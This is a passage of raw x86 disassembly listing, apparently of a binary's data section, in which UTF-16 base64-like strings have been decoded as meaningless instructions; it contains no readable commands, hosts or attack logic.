  40b452:	2f                   	das
  40b453:	00 50 00             	add    %dl,0x0(%eax)
  40b456:	72 00                	jb     0x40b458
  40b458:	2f                   	das
  40b459:	00 59 00             	add    %bl,0x0(%ecx)
  40b45c:	2f                   	das
  40b45d:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b461:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40b465:	00 45 00             	add    %al,0x0(%ebp)
  40b468:	38 00                	cmp    %al,(%eax)
  40b46a:	76 00                	jbe    0x40b46c
  40b46c:	72 00                	jb     0x40b46e
  40b46e:	7a 00                	jp     0x40b470
  40b470:	49                   	dec    %ecx
  40b471:	00 31                	add    %dh,(%ecx)
  40b473:	00 4f 00             	add    %cl,0x0(%edi)
  40b476:	4a                   	dec    %edx
  40b477:	00 2b                	add    %ch,(%ebx)
  40b479:	00 75 00             	add    %dh,0x0(%ebp)
  40b47c:	45                   	inc    %ebp
  40b47d:	00 70 00             	add    %dh,0x0(%eax)
  40b480:	31 00                	xor    %eax,(%eax)
  40b482:	71 00                	jno    0x40b484
  40b484:	30 00                	xor    %al,(%eax)
  40b486:	4d                   	dec    %ebp
  40b487:	00 4a 00             	add    %cl,0x0(%edx)
  40b48a:	4d                   	dec    %ebp
  40b48b:	00 4f 00             	add    %cl,0x0(%edi)
  40b48e:	64 00 42 00          	add    %al,%fs:0x0(%edx)
  40b492:	55                   	push   %ebp
  40b493:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40b497:	00 35 00 4c 00 56    	add    %dh,0x56004c00
  40b49d:	00 69 00             	add    %ch,0x0(%ecx)
  40b4a0:	4e                   	dec    %esi
  40b4a1:	00 51 00             	add    %dl,0x0(%ecx)
  40b4a4:	5a                   	pop    %edx
  40b4a5:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40b4a9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b4ac:	51                   	push   %ecx
  40b4ad:	00 55 00             	add    %dl,0x0(%ebp)
  40b4b0:	2b 00                	sub    (%eax),%eax
  40b4b2:	59                   	pop    %ecx
  40b4b3:	00 75 00             	add    %dh,0x0(%ebp)
  40b4b6:	31 00                	xor    %eax,(%eax)
  40b4b8:	57                   	push   %edi
  40b4b9:	00 69 00             	add    %ch,0x0(%ecx)
  40b4bc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4bd:	00 49 00             	add    %cl,0x0(%ecx)
  40b4c0:	2b 00                	sub    (%eax),%eax
  40b4c2:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40b4c6:	61                   	popa
  40b4c7:	00 7a 00             	add    %bh,0x0(%edx)
  40b4ca:	52                   	push   %edx
  40b4cb:	00 76 00             	add    %dh,0x0(%esi)
  40b4ce:	79 00                	jns    0x40b4d0
  40b4d0:	49                   	dec    %ecx
  40b4d1:	00 4b 00             	add    %cl,0x0(%ebx)
  40b4d4:	33 00                	xor    (%eax),%eax
  40b4d6:	43                   	inc    %ebx
  40b4d7:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40b4db:	00 69 00             	add    %ch,0x0(%ecx)
  40b4de:	35 00 49 00 55       	xor    $0x55004900,%eax
  40b4e3:	00 35 00 63 00 30    	add    %dh,0x30006300
  40b4e9:	00 52 00             	add    %dl,0x0(%edx)
  40b4ec:	78 00                	js     0x40b4ee
  40b4ee:	52                   	push   %edx
  40b4ef:	00 41 00             	add    %al,0x0(%ecx)
  40b4f2:	68 00 2f 00 42       	push   $0x42002f00
  40b4f7:	00 58 00             	add    %bl,0x0(%eax)
  40b4fa:	63 00                	arpl   %eax,(%eax)
  40b4fc:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40b500:	74 00                	je     0x40b502
  40b502:	4b                   	dec    %ebx
  40b503:	00 6d 00             	add    %ch,0x0(%ebp)
  40b506:	39 00                	cmp    %eax,(%eax)
  40b508:	63 00                	arpl   %eax,(%eax)
  40b50a:	53                   	push   %ebx
  40b50b:	00 50 00             	add    %dl,0x0(%eax)
  40b50e:	38 00                	cmp    %al,(%eax)
  40b510:	53                   	push   %ebx
  40b511:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  40b515:	00 42 00             	add    %al,0x0(%edx)
  40b518:	4b                   	dec    %ebx
  40b519:	00 39                	add    %bh,(%ecx)
  40b51b:	00 66 00             	add    %ah,0x0(%esi)
  40b51e:	56                   	push   %esi
  40b51f:	00 73 00             	add    %dh,0x0(%ebx)
  40b522:	30 00                	xor    %al,(%eax)
  40b524:	77 00                	ja     0x40b526
  40b526:	68 00 76 00 62       	push   $0x62007600
  40b52b:	00 77 00             	add    %dh,0x0(%edi)
  40b52e:	61                   	popa
  40b52f:	00 2f                	add    %ch,(%edi)
  40b531:	00 32                	add    %dh,(%edx)
  40b533:	00 6a 00             	add    %ch,0x0(%edx)
  40b536:	47                   	inc    %edi
  40b537:	00 6f 00             	add    %ch,0x0(%edi)
  40b53a:	5a                   	pop    %edx
  40b53b:	00 30                	add    %dh,(%eax)
  40b53d:	00 62 00             	add    %ah,0x0(%edx)
  40b540:	76 00                	jbe    0x40b542
  40b542:	61                   	popa
  40b543:	00 76 00             	add    %dh,0x0(%esi)
  40b546:	4e                   	dec    %esi
  40b547:	00 2b                	add    %ch,(%ebx)
  40b549:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40b54d:	00 76 00             	add    %dh,0x0(%esi)
  40b550:	32 00                	xor    (%eax),%al
  40b552:	47                   	inc    %edi
  40b553:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40b557:	00 41 00             	add    %al,0x0(%ecx)
  40b55a:	39 00                	cmp    %eax,(%eax)
  40b55c:	72 00                	jb     0x40b55e
  40b55e:	48                   	dec    %eax
  40b55f:	00 51 00             	add    %dl,0x0(%ecx)
  40b562:	4f                   	dec    %edi
  40b563:	00 76 00             	add    %dh,0x0(%esi)
  40b566:	4e                   	dec    %esi
  40b567:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b56a:	31 00                	xor    %eax,(%eax)
  40b56c:	4f                   	dec    %edi
  40b56d:	00 6e 00             	add    %ch,0x0(%esi)
  40b570:	49                   	dec    %ecx
  40b571:	00 77 00             	add    %dh,0x0(%edi)
  40b574:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b577:	00 65 00             	add    %ah,0x0(%ebp)
  40b57a:	32 00                	xor    (%eax),%al
  40b57c:	56                   	push   %esi
  40b57d:	00 59 00             	add    %bl,0x0(%ecx)
  40b580:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40b584:	2f                   	das
  40b585:	00 66 00             	add    %ah,0x0(%esi)
  40b588:	5a                   	pop    %edx
  40b589:	00 65 00             	add    %ah,0x0(%ebp)
  40b58c:	47                   	inc    %edi
  40b58d:	00 71 00             	add    %dh,0x0(%ecx)
  40b590:	50                   	push   %eax
  40b591:	00 36                	add    %dh,(%esi)
  40b593:	00 4b 00             	add    %cl,0x0(%ebx)
  40b596:	4f                   	dec    %edi
  40b597:	00 4f 00             	add    %cl,0x0(%edi)
  40b59a:	42                   	inc    %edx
  40b59b:	00 61 00             	add    %ah,0x0(%ecx)
  40b59e:	77 00                	ja     0x40b5a0
  40b5a0:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5a1:	00 52 00             	add    %dl,0x0(%edx)
  40b5a4:	2b 00                	sub    (%eax),%eax
  40b5a6:	6c                   	insb   (%dx),%es:(%edi)
  40b5a7:	00 53 00             	add    %dl,0x0(%ebx)
  40b5aa:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40b5ae:	52                   	push   %edx
  40b5af:	00 6a 00             	add    %ch,0x0(%edx)
  40b5b2:	70 00                	jo     0x40b5b4
  40b5b4:	44                   	inc    %esp
  40b5b5:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40b5b9:	00 5a 00             	add    %bl,0x0(%edx)
  40b5bc:	6c                   	insb   (%dx),%es:(%edi)
  40b5bd:	00 4a 00             	add    %cl,0x0(%edx)
  40b5c0:	30 00                	xor    %al,(%eax)
  40b5c2:	45                   	inc    %ebp
  40b5c3:	00 37                	add    %dh,(%edi)
  40b5c5:	00 73 00             	add    %dh,0x0(%ebx)
  40b5c8:	33 00                	xor    (%eax),%eax
  40b5ca:	72 00                	jb     0x40b5cc
  40b5cc:	4e                   	dec    %esi
  40b5cd:	00 4d 00             	add    %cl,0x0(%ebp)
  40b5d0:	43                   	inc    %ebx
  40b5d1:	00 50 00             	add    %dl,0x0(%eax)
  40b5d4:	4a                   	dec    %edx
  40b5d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5d8:	32 00                	xor    (%eax),%al
  40b5da:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5db:	00 6e 00             	add    %ch,0x0(%esi)
  40b5de:	2b 00                	sub    (%eax),%eax
  40b5e0:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40b5e4:	4a                   	dec    %edx
  40b5e5:	00 75 00             	add    %dh,0x0(%ebp)
  40b5e8:	4b                   	dec    %ebx
  40b5e9:	00 65 00             	add    %ah,0x0(%ebp)
  40b5ec:	35 00 35 00 77       	xor    $0x77003500,%eax
  40b5f1:	00 72 00             	add    %dh,0x0(%edx)
  40b5f4:	69 00 51 00 59 00    	imul   $0x590051,(%eax),%eax
  40b5fa:	6d                   	insl   (%dx),%es:(%edi)
  40b5fb:	00 4d 00             	add    %cl,0x0(%ebp)
  40b5fe:	59                   	pop    %ecx
  40b5ff:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b602:	35 00 4c 00 6e       	xor    $0x6e004c00,%eax
  40b607:	00 57 00             	add    %dl,0x0(%edi)
  40b60a:	44                   	inc    %esp
  40b60b:	00 4a 00             	add    %cl,0x0(%edx)
  40b60e:	4a                   	dec    %edx
  40b60f:	00 59 00             	add    %bl,0x0(%ecx)
  40b612:	59                   	pop    %ecx
  40b613:	00 57 00             	add    %dl,0x0(%edi)
  40b616:	39 00                	cmp    %eax,(%eax)
  40b618:	6b 00 69             	imul   $0x69,(%eax),%eax
  40b61b:	00 75 00             	add    %dh,0x0(%ebp)
  40b61e:	42                   	inc    %edx
  40b61f:	00 33                	add    %dh,(%ebx)
  40b621:	00 35 00 56 00 76    	add    %dh,0x76005600
  40b627:	00 56 00             	add    %dl,0x0(%esi)
  40b62a:	42                   	inc    %edx
  40b62b:	00 37                	add    %dh,(%edi)
  40b62d:	00 39                	add    %bh,(%ecx)
  40b62f:	00 45 00             	add    %al,0x0(%ebp)
  40b632:	5a                   	pop    %edx
  40b633:	00 43 00             	add    %al,0x0(%ebx)
  40b636:	41                   	inc    %ecx
  40b637:	00 67 00             	add    %ah,0x0(%edi)
  40b63a:	30 00                	xor    %al,(%eax)
  40b63c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b640:	64 00 33             	add    %dh,%fs:(%ebx)
  40b643:	00 52 00             	add    %dl,0x0(%edx)
  40b646:	74 00                	je     0x40b648
  40b648:	33 00                	xor    (%eax),%eax
  40b64a:	71 00                	jno    0x40b64c
  40b64c:	2b 00                	sub    (%eax),%eax
  40b64e:	41                   	inc    %ecx
  40b64f:	00 7a 00             	add    %bh,0x0(%edx)
  40b652:	75 00                	jne    0x40b654
  40b654:	77 00                	ja     0x40b656
  40b656:	2f                   	das
  40b657:	00 6e 00             	add    %ch,0x0(%esi)
  40b65a:	75 00                	jne    0x40b65c
  40b65c:	50                   	push   %eax
  40b65d:	00 78 00             	add    %bh,0x0(%eax)
  40b660:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b664:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40b669:	32 00                	xor    (%eax),%al
  40b66b:	57                   	push   %edi
  40b66c:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40b670:	00 36                	add    %dh,(%esi)
  40b672:	00 43 00             	add    %al,0x0(%ebx)
  40b675:	49                   	dec    %ecx
  40b676:	00 6e 00             	add    %ch,0x0(%esi)
  40b679:	72 00                	jb     0x40b67b
  40b67b:	79 00                	jns    0x40b67d
  40b67d:	69 00 36 00 32 00    	imul   $0x320036,(%eax),%eax
  40b683:	75 00                	jne    0x40b685
  40b685:	6a 00                	push   $0x0
  40b687:	63 00                	arpl   %eax,(%eax)
  40b689:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40b68d:	30 00                	xor    %al,(%eax)
  40b68f:	4f                   	dec    %edi
  40b690:	00 5a 00             	add    %bl,0x0(%edx)
  40b693:	39 00                	cmp    %eax,(%eax)
  40b695:	51                   	push   %ecx
  40b696:	00 58 00             	add    %bl,0x0(%eax)
  40b699:	51                   	push   %ecx
  40b69a:	00 5a 00             	add    %bl,0x0(%edx)
  40b69d:	53                   	push   %ebx
  40b69e:	00 59 00             	add    %bl,0x0(%ecx)
  40b6a1:	76 00                	jbe    0x40b6a3
  40b6a3:	32 00                	xor    (%eax),%al
  40b6a5:	63 00                	arpl   %eax,(%eax)
  40b6a7:	55                   	push   %ebp
  40b6a8:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b6ac:	00 38                	add    %bh,(%eax)
  40b6ae:	00 73 00             	add    %dh,0x0(%ebx)
  40b6b1:	46                   	inc    %esi
  40b6b2:	00 7a 00             	add    %bh,0x0(%edx)
  40b6b5:	74 00                	je     0x40b6b7
  40b6b7:	76 00                	jbe    0x40b6b9
  40b6b9:	66 00 64 00 37       	data16 add %ah,0x37(%eax,%eax,1)
  40b6be:	00 55 00             	add    %dl,0x0(%ebp)
  40b6c1:	6d                   	insl   (%dx),%es:(%edi)
  40b6c2:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40b6c6:	00 67 00             	add    %ah,0x0(%edi)
  40b6c9:	4a                   	dec    %edx
  40b6ca:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6cd:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b6d1:	71 00                	jno    0x40b6d3
  40b6d3:	2f                   	das
  40b6d4:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40b6d8:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40b6dc:	00 33                	add    %dh,(%ebx)
  40b6de:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40b6e2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b6e5:	58                   	pop    %eax
  40b6e6:	00 5a 00             	add    %bl,0x0(%edx)
  40b6e9:	73 00                	jae    0x40b6eb
  40b6eb:	70 00                	jo     0x40b6ed
  40b6ed:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40b6f1:	39 00                	cmp    %eax,(%eax)
  40b6f3:	39 00                	cmp    %eax,(%eax)
  40b6f5:	74 00                	je     0x40b6f7
  40b6f7:	63 00                	arpl   %eax,(%eax)
  40b6f9:	2f                   	das
  40b6fa:	00 58 00             	add    %bl,0x0(%eax)
  40b6fd:	4d                   	dec    %ebp
  40b6fe:	00 62 00             	add    %ah,0x0(%edx)
  40b701:	4b                   	dec    %ebx
  40b702:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40b706:	00 76 00             	add    %dh,0x0(%esi)
  40b709:	42                   	inc    %edx
  40b70a:	00 55 00             	add    %dl,0x0(%ebp)
  40b70d:	4e                   	dec    %esi
  40b70e:	00 4f 00             	add    %cl,0x0(%edi)
  40b711:	59                   	pop    %ecx
  40b712:	00 42 00             	add    %al,0x0(%edx)
  40b715:	42                   	inc    %edx
  40b716:	00 51 00             	add    %dl,0x0(%ecx)
  40b719:	33 00                	xor    (%eax),%eax
  40b71b:	5a                   	pop    %edx
  40b71c:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40b720:	00 4c 00 30          	add    %cl,0x30(%eax,%eax,1)
  40b724:	00 69 00             	add    %ch,0x0(%ecx)
  40b727:	30 00                	xor    %al,(%eax)
  40b729:	4b                   	dec    %ebx
  40b72a:	00 6f 00             	add    %ch,0x0(%edi)
  40b72d:	37                   	aaa
  40b72e:	00 52 00             	add    %dl,0x0(%edx)
  40b731:	42                   	inc    %edx
  40b732:	00 71 00             	add    %dh,0x0(%ecx)
  40b735:	4d                   	dec    %ebp
  40b736:	00 4f 00             	add    %cl,0x0(%edi)
  40b739:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40b73d:	4a                   	dec    %edx
  40b73e:	00 5a 00             	add    %bl,0x0(%edx)
  40b741:	39 00                	cmp    %eax,(%eax)
  40b743:	69 00 52 00 50 00    	imul   $0x500052,(%eax),%eax
  40b749:	78 00                	js     0x40b74b
  40b74b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b74c:	00 50 00             	add    %dl,0x0(%eax)
  40b74f:	32 00                	xor    (%eax),%al
  40b751:	69 00 4b 00 68 00    	imul   $0x68004b,(%eax),%eax
  40b757:	6f                   	outsl  %ds:(%esi),(%dx)
  40b758:	00 75 00             	add    %dh,0x0(%ebp)
  40b75b:	72 00                	jb     0x40b75d
  40b75d:	75 00                	jne    0x40b75f
  40b75f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b760:	00 50 00             	add    %dl,0x0(%eax)
  40b763:	76 00                	jbe    0x40b765
  40b765:	5a                   	pop    %edx
  40b766:	00 48 00             	add    %cl,0x0(%eax)
  40b769:	39 00                	cmp    %eax,(%eax)
  40b76b:	62 00                	bound  %eax,(%eax)
  40b76d:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40b771:	53                   	push   %ebx
  40b772:	00 72 00             	add    %dh,0x0(%edx)
  40b775:	4a                   	dec    %edx
  40b776:	00 4a 00             	add    %cl,0x0(%edx)
  40b779:	58                   	pop    %eax
  40b77a:	00 35 00 46 00 36    	add    %dh,0x36004600
  40b780:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  40b784:	00 58 00             	add    %bl,0x0(%eax)
  40b787:	46                   	inc    %esi
  40b788:	00 2f                	add    %ch,(%edi)
  40b78a:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  40b78e:	00 6e 00             	add    %ch,0x0(%esi)
  40b791:	59                   	pop    %ecx
  40b792:	00 62 00             	add    %ah,0x0(%edx)
  40b795:	59                   	pop    %ecx
  40b796:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40b79a:	00 37                	add    %dh,(%edi)
  40b79c:	00 47 00             	add    %al,0x0(%edi)
  40b79f:	66 00 46 00          	data16 add %al,0x0(%esi)
  40b7a3:	62 00                	bound  %eax,(%eax)
  40b7a5:	59                   	pop    %ecx
  40b7a6:	00 41 00             	add    %al,0x0(%ecx)
  40b7a9:	70 00                	jo     0x40b7ab
  40b7ab:	32 00                	xor    (%eax),%al
  40b7ad:	4d                   	dec    %ebp
  40b7ae:	00 37                	add    %dh,(%edi)
  40b7b0:	00 71 00             	add    %dh,0x0(%ecx)
  40b7b3:	6b 00 42             	imul   $0x42,(%eax),%eax
  40b7b6:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40b7ba:	00 63 00             	add    %ah,0x0(%ebx)
  40b7bd:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40b7c1:	65 00 32             	add    %dh,%gs:(%edx)
  40b7c4:	00 61 00             	add    %ah,0x0(%ecx)
  40b7c7:	49                   	dec    %ecx
  40b7c8:	00 72 00             	add    %dh,0x0(%edx)
  40b7cb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7cc:	00 79 00             	add    %bh,0x0(%ecx)
  40b7cf:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40b7d3:	69 00 6a 00 66 00    	imul   $0x66006a,(%eax),%eax
  40b7d9:	53                   	push   %ebx
  40b7da:	00 4d 00             	add    %cl,0x0(%ebp)
  40b7dd:	37                   	aaa
  40b7de:	00 6e 00             	add    %ch,0x0(%esi)
  40b7e1:	38 00                	cmp    %al,(%eax)
  40b7e3:	71 00                	jno    0x40b7e5
  40b7e5:	34 00                	xor    $0x0,%al
  40b7e7:	74 00                	je     0x40b7e9
  40b7e9:	7a 00                	jp     0x40b7eb
  40b7eb:	76 00                	jbe    0x40b7ed
  40b7ed:	69 00 41 00 63 00    	imul   $0x630041,(%eax),%eax
  40b7f3:	70 00                	jo     0x40b7f5
  40b7f5:	4c                   	dec    %esp
  40b7f6:	00 75 00             	add    %dh,0x0(%ebp)
  40b7f9:	4b                   	dec    %ebx
  40b7fa:	00 52 00             	add    %dl,0x0(%edx)
  40b7fd:	73 00                	jae    0x40b7ff
  40b7ff:	44                   	inc    %esp
  40b800:	00 65 00             	add    %ah,0x0(%ebp)
  40b803:	4f                   	dec    %edi
  40b804:	00 36                	add    %dh,(%esi)
  40b806:	00 67 00             	add    %ah,0x0(%edi)
  40b809:	34 00                	xor    $0x0,%al
  40b80b:	56                   	push   %esi
  40b80c:	00 51 00             	add    %dl,0x0(%ecx)
  40b80f:	72 00                	jb     0x40b811
  40b811:	44                   	inc    %esp
  40b812:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40b816:	00 47 00             	add    %al,0x0(%edi)
  40b819:	52                   	push   %edx
  40b81a:	00 73 00             	add    %dh,0x0(%ebx)
  40b81d:	6c                   	insb   (%dx),%es:(%edi)
  40b81e:	00 66 00             	add    %ah,0x0(%esi)
  40b821:	2f                   	das
  40b822:	00 6b 00             	add    %ch,0x0(%ebx)
  40b825:	78 00                	js     0x40b827
  40b827:	70 00                	jo     0x40b829
  40b829:	68 00 71 00 6a       	push   $0x6a007100
  40b82e:	00 75 00             	add    %dh,0x0(%ebp)
  40b831:	72 00                	jb     0x40b833
  40b833:	79 00                	jns    0x40b835
  40b835:	2b 00                	sub    (%eax),%eax
  40b837:	2f                   	das
  40b838:	00 35 00 4a 00 48    	add    %dh,0x48004a00
  40b83e:	00 32                	add    %dh,(%edx)
  40b840:	00 6d 00             	add    %ch,0x0(%ebp)
  40b843:	48                   	dec    %eax
  40b844:	00 78 00             	add    %bh,0x0(%eax)
  40b847:	54                   	push   %esp
  40b848:	00 37                	add    %dh,(%edi)
  40b84a:	00 50 00             	add    %dl,0x0(%eax)
  40b84d:	30 00                	xor    %al,(%eax)
  40b84f:	39 00                	cmp    %eax,(%eax)
  40b851:	68 00 79 00 6f       	push   $0x6f007900
  40b856:	00 73 00             	add    %dh,0x0(%ebx)
  40b859:	6a 00                	push   $0x0
  40b85b:	65 00 39             	add    %bh,%gs:(%ecx)
  40b85e:	00 65 00             	add    %ah,0x0(%ebp)
  40b861:	74 00                	je     0x40b863
  40b863:	77 00                	ja     0x40b865
  40b865:	4a                   	dec    %edx
  40b866:	00 2f                	add    %ch,(%edi)
  40b868:	00 46 00             	add    %al,0x0(%esi)
  40b86b:	32 00                	xor    (%eax),%al
  40b86d:	35 00 5a 00 51       	xor    $0x51005a00,%eax
  40b872:	00 78 00             	add    %bh,0x0(%eax)
  40b875:	72 00                	jb     0x40b877
  40b877:	49                   	dec    %ecx
  40b878:	00 47 00             	add    %al,0x0(%edi)
  40b87b:	78 00                	js     0x40b87d
  40b87d:	4c                   	dec    %esp
  40b87e:	00 57 00             	add    %dl,0x0(%edi)
  40b881:	75 00                	jne    0x40b883
  40b883:	43                   	inc    %ebx
  40b884:	00 53 00             	add    %dl,0x0(%ebx)
  40b887:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40b88a:	00 56 00             	add    %dl,0x0(%esi)
  40b88d:	31 00                	xor    %eax,(%eax)
  40b88f:	7a 00                	jp     0x40b891
  40b891:	4b                   	dec    %ebx
  40b892:	00 56 00             	add    %dl,0x0(%esi)
  40b895:	4f                   	dec    %edi
  40b896:	00 69 00             	add    %ch,0x0(%ecx)
  40b899:	73 00                	jae    0x40b89b
  40b89b:	71 00                	jno    0x40b89d
  40b89d:	57                   	push   %edi
  40b89e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b8a1:	38 00                	cmp    %al,(%eax)
  40b8a3:	41                   	inc    %ecx
  40b8a4:	00 56 00             	add    %dl,0x0(%esi)
  40b8a7:	2b 00                	sub    (%eax),%eax
  40b8a9:	56                   	push   %esi
  40b8aa:	00 31                	add    %dh,(%ecx)
  40b8ac:	00 46 00             	add    %al,0x0(%esi)
  40b8af:	50                   	push   %eax
  40b8b0:	00 43 00             	add    %al,0x0(%ebx)
  40b8b3:	7a 00                	jp     0x40b8b5
  40b8b5:	35 00 4a 00 61       	xor    $0x61004a00,%eax
  40b8ba:	00 65 00             	add    %ah,0x0(%ebp)
  40b8bd:	52                   	push   %edx
  40b8be:	00 75 00             	add    %dh,0x0(%ebp)
  40b8c1:	50                   	push   %eax
  40b8c2:	00 4d 00             	add    %cl,0x0(%ebp)
  40b8c5:	34 00                	xor    $0x0,%al
  40b8c7:	35 00 30 00 39       	xor    $0x39003000,%eax
  40b8cc:	00 45 00             	add    %al,0x0(%ebp)
  40b8cf:	79 00                	jns    0x40b8d1
  40b8d1:	2b 00                	sub    (%eax),%eax
  40b8d3:	51                   	push   %ecx
  40b8d4:	00 5a 00             	add    %bl,0x0(%edx)
  40b8d7:	4c                   	dec    %esp
  40b8d8:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40b8dc:	00 66 00             	add    %ah,0x0(%esi)
  40b8df:	6b 00 42             	imul   $0x42,(%eax),%eax
  40b8e2:	00 78 00             	add    %bh,0x0(%eax)
  40b8e5:	45                   	inc    %ebp
  40b8e6:	00 52 00             	add    %dl,0x0(%edx)
  40b8e9:	52                   	push   %edx
  40b8ea:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8ed:	37                   	aaa
  40b8ee:	00 2f                	add    %ch,(%edi)
  40b8f0:	00 67 00             	add    %ah,0x0(%edi)
  40b8f3:	75 00                	jne    0x40b8f5
  40b8f5:	2b 00                	sub    (%eax),%eax
  40b8f7:	4c                   	dec    %esp
  40b8f8:	00 46 00             	add    %al,0x0(%esi)
  40b8fb:	7a 00                	jp     0x40b8fd
  40b8fd:	67 00 6d 00          	add    %ch,0x0(%di)
  40b901:	70 00                	jo     0x40b903
  40b903:	37                   	aaa
  40b904:	00 5a 00             	add    %bl,0x0(%edx)
  40b907:	54                   	push   %esp
  40b908:	00 30                	add    %dh,(%eax)
  40b90a:	00 77 00             	add    %dh,0x0(%edi)
  40b90d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b90e:	00 73 00             	add    %dh,0x0(%ebx)
  40b911:	78 00                	js     0x40b913
  40b913:	6e                   	outsb  %ds:(%esi),(%dx)
  40b914:	00 38                	add    %bh,(%eax)
  40b916:	00 70 00             	add    %dh,0x0(%eax)
  40b919:	35 00 6a 00 4e       	xor    $0x4e006a00,%eax
  40b91e:	00 55 00             	add    %dl,0x0(%ebp)
  40b921:	72 00                	jb     0x40b923
  40b923:	49                   	dec    %ecx
  40b924:	00 51 00             	add    %dl,0x0(%ecx)
  40b927:	2f                   	das
  40b928:	00 6f 00             	add    %ch,0x0(%edi)
  40b92b:	54                   	push   %esp
  40b92c:	00 57 00             	add    %dl,0x0(%edi)
  40b92f:	4d                   	dec    %ebp
  40b930:	00 7a 00             	add    %bh,0x0(%edx)
  40b933:	74 00                	je     0x40b935
  40b935:	4a                   	dec    %edx
  40b936:	00 6b 00             	add    %ch,0x0(%ebx)
  40b939:	33 00                	xor    (%eax),%eax
  40b93b:	45                   	inc    %ebp
  40b93c:	00 67 00             	add    %ah,0x0(%edi)
  40b93f:	76 00                	jbe    0x40b941
  40b941:	47                   	inc    %edi
  40b942:	00 58 00             	add    %bl,0x0(%eax)
  40b945:	69 00 43 00 6f 00    	imul   $0x6f0043,(%eax),%eax
  40b94b:	2b 00                	sub    (%eax),%eax
  40b94d:	32 00                	xor    (%eax),%al
  40b94f:	71 00                	jno    0x40b951
  40b951:	34 00                	xor    $0x0,%al
  40b953:	78 00                	js     0x40b955
  40b955:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40b959:	67 00 31             	add    %dh,(%bx,%di)
  40b95c:	00 6a 00             	add    %ch,0x0(%edx)
  40b95f:	71 00                	jno    0x40b961
  40b961:	75 00                	jne    0x40b963
  40b963:	4b                   	dec    %ebx
  40b964:	00 39                	add    %bh,(%ecx)
  40b966:	00 50 00             	add    %dl,0x0(%eax)
  40b969:	68 00 32 00 6e       	push   $0x6e003200
  40b96e:	00 5a 00             	add    %bl,0x0(%edx)
  40b971:	77 00                	ja     0x40b973
  40b973:	56                   	push   %esi
  40b974:	00 52 00             	add    %dl,0x0(%edx)
  40b977:	31 00                	xor    %eax,(%eax)
  40b979:	53                   	push   %ebx
  40b97a:	00 4f 00             	add    %cl,0x0(%edi)
  40b97d:	76 00                	jbe    0x40b97f
  40b97f:	45                   	inc    %ebp
  40b980:	00 52 00             	add    %dl,0x0(%edx)
  40b983:	7a 00                	jp     0x40b985
  40b985:	63 00                	arpl   %eax,(%eax)
  40b987:	4c                   	dec    %esp
  40b988:	00 68 00             	add    %ch,0x0(%eax)
  40b98b:	6c                   	insb   (%dx),%es:(%edi)
  40b98c:	00 76 00             	add    %dh,0x0(%esi)
  40b98f:	6a 00                	push   $0x0
  40b991:	4b                   	dec    %ebx
  40b992:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  40b996:	00 35 00 4b 00 37    	add    %dh,0x37004b00
  40b99c:	00 48 00             	add    %cl,0x0(%eax)
  40b99f:	68 00 6f 00 5a       	push   $0x5a006f00
  40b9a4:	00 33                	add    %dh,(%ebx)
  40b9a6:	00 50 00             	add    %dl,0x0(%eax)
  40b9a9:	76 00                	jbe    0x40b9ab
  40b9ab:	57                   	push   %edi
  40b9ac:	00 65 00             	add    %ah,0x0(%ebp)
  40b9af:	53                   	push   %ebx
  40b9b0:	00 38                	add    %bh,(%eax)
  40b9b2:	00 52 00             	add    %dl,0x0(%edx)
  40b9b5:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
